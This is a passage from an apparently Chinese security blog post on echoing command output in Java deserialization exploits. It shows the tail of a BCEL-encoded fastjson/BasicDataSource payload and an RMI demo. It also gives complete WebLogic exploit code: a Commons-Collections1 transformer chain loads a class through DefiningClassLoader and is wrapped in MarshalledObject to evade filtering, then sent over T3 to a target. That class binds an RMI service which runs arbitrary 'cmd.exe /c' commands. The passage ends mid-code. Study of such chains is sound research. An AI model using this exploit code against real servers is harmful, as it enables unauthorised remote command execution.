&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AuU$5dw$d3F$Q$bdk$cb$5eY$uqb$e7$D$93$94RJ$c1$J$c1$a6$40I$9a$844$q$85$f2$a1$E$g$a7$a1$wM$8b$y$af$j$r$8e$e4$p$cb$3d$fc$p$9ey$b19$f5$a1$7d$ebC$ffI$ffDaVv$9c$bav$fc$b0$ab$99$bd3$9e$7bgV$fa$fb$df$df$ff$Ap$HG$gfp$8fc$8d$e3$h$V$eb$w$eek$88$60C$$$9b$g$be$c5$D$8e$87$w$be$d3$f0$I$8f5$q$f0$84$e3$a9$86$R$Y$i$5b$g$92$b8$t$8dm$f9$f4L$c5s$8e$ef$e5$e3$8e$86$J$UT$ecj$b8$80$l$a4$b1$c7$f1$82$e3G$86$f8$aa$e3$3a$c1$gC4$3b$b7$c7$a0lz$r$c1$904$iWl7$8e$8b$c2$df$b5$8aU$f2$a4$M$cf$b6$aa$7b$96$efH$bb$ebT$82$D$a7$ce$900$CQ$P$96$96$96V$c8$r$5e$L$9ba2k$iZ$bfY$f9$aa$e5V$f2$85$c0w$dc$ca$8a$cc$l$b5$8fK2$d9$c0$nUR$P$7ca$jSl$e7$d4$f1$f2$8f$ddZ$p$u$84n$J$a0$bd$q$7c$86$99a$80$9d$f0$90$60$a3$c5F$b9$y$7cQ$da$e9$c2$cf$f7$e0$h$7d$t2e$H$db$c3$fc$a7$a2$OV2$aa$92$W$M$p$85$c0$b2$8f$b6$acZ$c8$9d$ba$c3aR$_H$7eR$9eA$7b$f0$da$W$b5$c0$f1$5c$SD$5d$b5$ab$5dY$99$e8$R$K$93$f7$60$x$d4$h$K$xx$N$df$W$P$j$v$a7$de$951$t$e1$3af$f1$J$Vv$g$fa$dc$f7lQ$afo4$9cj$c8k$ec$ff$r3p$927G$j$60$88$e4m$99$e1$t$j$_$f13$c7$be$8e_$f0$xC$e6L$e5$a87$95$e2$R$c7$x$j$W$8a2$96$da85$5c9yZ$3a9$j$d0L$87$40YG$F$HD_cH$Pa$af$c3$91$98Y$5c$n$b5$9c$9a$ed$b9e$a7$a2$e3s$5c$d1q$uy$f3$ae$W$7d4$9f$V$P$85$j$9cd$ecgA$e5d_$O$l$baX$3d$b0$fc$40$O$e5$9c1$m$tux$7c$c0IST$RA_$f6$e9$93$e0$81$b9$ec$b4$c8$r$bf$7d$60$f9u$R$e47$3b$3b$b1$u$7b$fe$b6uL$fd$c8$N$bb$Q$c6Y$91$94$f5Vv$e8$df$9d$j$o$99$a6O$83$ba3$$$bd$aa$bc8F8$c5$T$7d$S$9c$de$3d$abV$T$$$b5t$e1$ec2$87$dd$N5$f0NF$_Y$a3$3d$I$_$c9$aeo$d9$C$9f$d1$bbf$G$f2$X$F$93$c3L$ebE$b2$f2$b43$dac$f3$z$b0$b7$f4$Q$c1$a7$b4$c6Cg$i$97h$d5$3b$AJq$99$f6$84$i$LBQ0S$I$R$t$dfa$h$R3$fe$kQ3$9aR$K$a6$92$8a$V$cc$d8$7c$a1$85x$T$bc$J$d5h$pa$5eOi$efp$ae$F$7d$ab$8d$Rs$a1$85$d1$ed6$92f$Lc$cb$K$5b$8e$ddhb$dc$5c$8e$fd$85tF$c9$c4$9aH$a5$d2$b4$bcx$f3$e1$9f6$s$cc$8c$d2$c4d$LS$7f$86$Ed$85$97$a1$d2$9a$a4$K$c7$90$c38$W$91$c2$3a$d2$d8$a4$f7$e9$W$s$b1$8f$e9$b0$fa$b5N$85$f8$CWi$bf$84$t$b8$86$y1$caa$Vs$98$t$s$8b$b8$8d$ebX$a0$bc$ebd$df$a0$T$85$b2$5c$pi$ae$S$eb$9b$U5$8b$c8$Hr$c59$be$e4$b8$c5q$9b$e3$O$c7Wd$C$Z$dc$r$84B$Z$t$a8$a2$c5$9e$b0$fb$5daGS$d3$efp$fe$N$d4$a7$f3Md$dev$b5T$J$dd$e11E$96T5F$3a$ab$90$l$91s$f4$cd$Y$e9$v$9f$a0$dcK$f8$9a$yY$JG$e4$R$c7$b2$fc$bb$95$b0Y$ab$l$B$e8$60$97$T$ac$G$A$A&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;: &quot;bbb&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218145459924.png" alt="image-20201218145459924"></p>
<p>​        首先我们看一下BasicDataSource这个类是tomcat下的一个类，在tomat-dbcp.jar中，在进行json解析的过程中会调用getConnection()</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218150110385.png" alt="image-20201218150110385"></p>
<p>​        在createDataSource中调用createConnectionFactory</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218150145651.png" alt="image-20201218150145651"></p>
<p>​        在createConnectionFactory中调用Class.forName，并将class_name和classloader传入，后面的过程就和之前的demo一样，不再分析了。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218150304057.png" alt="image-20201218150304057"></p>
<p>​        这种方法目前只能在低版本的fastjson中利用，高版本的fastjson中加入了autoType属性，无法调用BasicDataSource。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218151232364.png" alt="image-20201218151232364"></p>
<h3 id="RMI回显"><a href="#RMI回显" class="headerlink" title="RMI回显"></a>RMI回显</h3><p>​        首先我们看下如何注册和使用RMI服务，下面是RMI Demo代码</p>
<p>RMIServer.java</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">import java.net.MalformedURLException;</span><br><span class="line">import java.rmi.Naming;</span><br><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line">public class RMIServer &#123;</span><br><span class="line"></span><br><span class="line">    public interface IRemoteHelloWorld extends Remote &#123;  &#x2F;&#x2F; RMI调用对象接口定义，这个接口必须继承Remote接口，标明这是一个远程调用的接口，接口中定义的方法，会被Client端调用，也就是远程调用方法</span><br><span class="line">        public String hello() throws RemoteException;  &#x2F;&#x2F;远程调用方法必须要抛RemoteException异常</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public class RemoteHelloWorld extends UnicastRemoteObject implements IRemoteHelloWorld &#123;  &#x2F;&#x2F;远程对象实现类</span><br><span class="line">        &#x2F;&#x2F;UnicastRemoteObject用于导出的远程对象和获得与该远程对象通信的存根。</span><br><span class="line"></span><br><span class="line">        protected RemoteHelloWorld() throws RemoteException &#123; &#x2F;&#x2F;实现类需要重写无参构造器，且需要抛出RemoteException异常</span><br><span class="line">            super();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public String hello() &#123;</span><br><span class="line">            return &quot;helloworld&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void start() throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        RemoteHelloWorld h &#x3D; new RemoteHelloWorld();  &#x2F;&#x2F;创建远程对象</span><br><span class="line">        LocateRegistry.createRegistry(1099);  &#x2F;&#x2F;创建一个接受对1099端口调用的远程对象注册表</span><br><span class="line">        Naming.rebind(&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;Hello&quot;, h); &#x2F;&#x2F;把远程对象注册到RMI注册服务器上，并命名为Hello</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        new RMIServer().start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>RMIClient.java</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import com.test.rmi.RMIServer;</span><br><span class="line"></span><br><span class="line">import java.rmi.Naming;</span><br><span class="line"></span><br><span class="line">public class RMIClient &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        RMIServer.IRemoteHelloWorld hello &#x3D; (RMIServer.IRemoteHelloWorld)</span><br><span class="line">            Naming.lookup(&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;Hello&quot;);</span><br><span class="line">        String res &#x3D; hello.hello();</span><br><span class="line">        System.out.println(res);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        首先打开服务端，再打开客户端，最终执行了服务端的hello方法，并将执行结果返回给客户端。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218170046027.png" alt="image-20201218170046027"></p>
<p>​        因为使用RMI回显利用本质上还是会调用defineClass方法来加载远程类，但是ClassLoader是一个抽象类，不能通过反射来获取抽象类的对象，因此我们如果要利用defineClass方法加载类的字节码，可以尝试寻找ClassLoader的子类,我在weblogic下进行寻找，有不少的类都继承了ClassLoader。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221094830804.png" alt="image-20201221094830804"></p>
<p>​        在这些类中，有几个类在实现过程中会直接调用父类的defineClass方法，比如weblogic.jar!\jxxload_help\PathVFSJavaLoader.class</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221101826314.png" alt="image-20201221101826314"></p>
<p>​        还有weblogic.jar!\org\mozilla\classfile\DefiningClassLoader.class</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221101949975.png" alt="image-20201221101949975"></p>
<p>​        找到了加载类字节码的方式后，我们再看下哪些部分开启了RMI服务，我们之前了解过开启RMI服务需要继承Remote类，因此我们可以寻找继承Remote类的类。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221102653829.png" alt="image-20201221102653829"></p>
<p>​        由于我们希望通过RMI来进行回显，所以我们要找到的RMI Server端开启的服务需要返回String类型的数据,比如ClusterMasterRemote类的getServerLocation方法。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221114120045.png" alt="image-20201221114120045"></p>
<p>​        根据这个思路我们可以实现ClusterMasterRemote类并且重写getServerLocation方法，在这个方法中执行命令，并将命令执行的结果返回。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> weblogic.cluster.singleton.ClusterMasterRemote;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMITest</span> <span class="keyword">implements</span> <span class="title">ClusterMasterRemote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        RMITest remote = <span class="keyword">new</span> RMITest();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Context context = <span class="keyword">new</span> InitialContext();</span><br><span class="line">            context.rebind(<span class="string">"test666"</span>,remote);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setServerLocation</span><span class="params">(String s, String s1)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getServerLocation</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> RemoteException </span>&#123;     <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">        List&lt;String&gt; cmds = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line"></span><br><span class="line">        cmds.add(<span class="string">"cmd.exe"</span>);</span><br><span class="line">        cmds.add(<span class="string">"/c"</span>);</span><br><span class="line">        cmds.add(cmd);</span><br><span class="line"></span><br><span class="line">        ProcessBuilder processBuilder = <span class="keyword">new</span> ProcessBuilder(cmds);</span><br><span class="line">        processBuilder.redirectErrorStream(<span class="keyword">true</span>);</span><br><span class="line">        Process proc = processBuilder.start();</span><br><span class="line"></span><br><span class="line">        BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(proc.getInputStream()));</span><br><span class="line">        StringBuffer sb = <span class="keyword">new</span> StringBuffer();</span><br><span class="line"></span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span> ((line = br.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            sb.append(line).append(<span class="string">"\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">return</span> e.getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221134435820.png" alt="image-20201221134435820"></p>
<p>​        另外我们还需要通过利用链比如common-collection1来通过DefiningClassLoader的defineClass来加载RMITest类并执行类中的main方法绑定一个RMI服务,通过访问这个RMI服务，并传入需要执行的命令，就可以获取命令执行后的结果。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(DefiningClassLoader<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getDeclaredConstructor", new Class[]&#123;Class[].class&#125;, new Object[]&#123;new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer("newInstance", new Class[]&#123;Object[].class&#125;, new Object[]&#123;new Object[0]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"defineClass"</span>,</span><br><span class="line">                        new Class[]&#123;String.class, byte[].class&#125;, new Object[]&#123;className, clsData&#125;),</span><br><span class="line">                new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"main", new Class[]&#123;String[].class&#125;&#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[]&#123;null&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="keyword">new</span> HashSet())&#125;;</span><br></pre></td></tr></table></figure>

<p>​        完整代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xerces.internal.impl.dv.util.Base64;</span><br><span class="line"><span class="keyword">import</span> com.supeream.serial.Reflections;</span><br><span class="line"><span class="keyword">import</span> com.supeream.serial.SerialDataGenerator;</span><br><span class="line"><span class="keyword">import</span> com.supeream.serial.Serializables;</span><br><span class="line"><span class="keyword">import</span> com.supeream.ssl.WeblogicTrustManager;</span><br><span class="line"><span class="keyword">import</span> com.supeream.weblogic.T3ProtocolOperation;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.mozilla.classfile.DefiningClassLoader;</span><br><span class="line"><span class="keyword">import</span> weblogic.cluster.singleton.ClusterMasterRemote;</span><br><span class="line"><span class="keyword">import</span> weblogic.corba.utils.MarshalledObject;</span><br><span class="line"><span class="keyword">import</span> weblogic.jndi.Environment;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String host = <span class="string">"192.168.3.30"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String port = <span class="string">"7001"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String classname = <span class="string">"RMITest"</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String url = <span class="string">"t3://"</span> + host + <span class="string">":"</span> + port;</span><br><span class="line">            <span class="keyword">byte</span>[] bs=getBs();</span><br><span class="line">            <span class="comment">// 安装RMI实例</span></span><br><span class="line">            invokeRMI(classname, bs);</span><br><span class="line"></span><br><span class="line">            Environment environment = <span class="keyword">new</span> Environment();</span><br><span class="line">            environment.setProviderUrl(url);</span><br><span class="line">            environment.setEnableServerAffinity(<span class="keyword">false</span>);</span><br><span class="line">            environment.setSSLClientTrustManager(<span class="keyword">new</span> WeblogicTrustManager());</span><br><span class="line">            Context context = environment.getInitialContext();</span><br><span class="line">            ClusterMasterRemote remote = (ClusterMasterRemote) context.lookup(<span class="string">"test666"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 调用RMI实例执行命令</span></span><br><span class="line">            String res = remote.getServerLocation(<span class="string">"ipconfig"</span>);</span><br><span class="line">            System.out.println(res);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">invokeRMI</span><span class="params">(String className, <span class="keyword">byte</span>[] clsData)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// common-collection1 构造transformers 定义自己的RMI接口</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(DefiningClassLoader<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getDeclaredConstructor", new Class[]&#123;Class[].class&#125;, new Object[]&#123;new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer("newInstance", new Class[]&#123;Object[].class&#125;, new Object[]&#123;new Object[0]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"defineClass"</span>,</span><br><span class="line">                        new Class[]&#123;String.class, byte[].class&#125;, new Object[]&#123;className, clsData&#125;),</span><br><span class="line">                new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"main", new Class[]&#123;String[].class&#125;&#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[]&#123;null&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="keyword">new</span> HashSet())&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        <span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        InvocationHandler handler = (InvocationHandler) Reflections</span><br><span class="line">                .getFirstCtor(</span><br><span class="line">                        <span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>)</span><br><span class="line">                .newInstance(Override<span class="class">.<span class="keyword">class</span>, <span class="title">lazyMap</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Map mapProxy = Map<span class="class">.<span class="keyword">class</span></span></span><br><span class="line"><span class="class">                .<span class="title">cast</span>(<span class="title">Proxy</span>.<span class="title">newProxyInstance</span>(<span class="title">SerialDataGenerator</span>.<span class="title">class</span>.<span class="title">getClassLoader</span>(),</span></span><br><span class="line">                        new Class[]&#123;Map.class&#125;, handler));</span><br><span class="line"></span><br><span class="line">        handler = (InvocationHandler) Reflections.getFirstCtor(</span><br><span class="line">                <span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>)</span><br><span class="line">                .newInstance(Override<span class="class">.<span class="keyword">class</span>, <span class="title">mapProxy</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化数据 MarshalledObject绕过</span></span><br><span class="line">        Object obj = <span class="keyword">new</span> MarshalledObject(handler);</span><br><span class="line">        ByteArrayOutputStream out = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objOut = <span class="keyword">new</span> ObjectOutputStream(out);</span><br><span class="line">        objOut.writeObject(obj);</span><br><span class="line">        objOut.flush();</span><br><span class="line">        objOut.close();</span><br><span class="line">        <span class="keyword">byte</span>[] payload = out.toByteArray();</span><br><span class="line">        <span class="comment">// t3发送</span></span><br><span class="line">        T3ProtocolOperation.send(host, port, payload);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] getBs() <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        File file=<span class="keyword">new</span> File(<span class="string">"C:\\Users\\admin\\Desktop\\RMITest.class"</span>);</span><br><span class="line">        Long filelength = file.length(); <span class="comment">// 获取文件长度</span></span><br><span class="line">        BufferedInputStream bis = <span class="keyword">null</span>;</span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        FileInputStream in =<span class="keyword">new</span> FileInputStream(file);</span><br><span class="line">        bis = <span class="keyword">new</span> BufferedInputStream(in);</span><br><span class="line">        <span class="keyword">byte</span>[] buf = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ((len = in.read(buf)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            baos.write(buf, <span class="number">0</span>, len);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">byte</span>[] buffer = baos.toByteArray();</span><br><span class="line">        <span 